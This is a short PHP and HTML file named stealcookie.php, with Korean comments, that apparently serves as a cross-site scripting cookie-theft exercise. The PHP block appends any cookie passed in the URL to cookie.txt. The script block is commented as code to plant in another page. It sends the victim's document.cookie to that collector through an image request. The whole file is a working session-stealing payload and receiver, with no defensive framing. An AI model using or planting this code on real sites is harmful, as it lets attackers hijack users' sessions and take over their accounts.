<?php //stealcookie.php 
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie']."\n";      //각 쿠키 구분을 위해 줄바꿈 넣기
    file_put_contents('cookie.txt', $cookie, FILE_APPEND);
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
</head>
<body>
    <script> //다른 파일에 심을 자바스크립트 코드
    new Image().src = "stealcookie.php?cookie=" + document.cookie; //현재 탭 쿠키값 서버로 전송
    </script>
</body>
</html>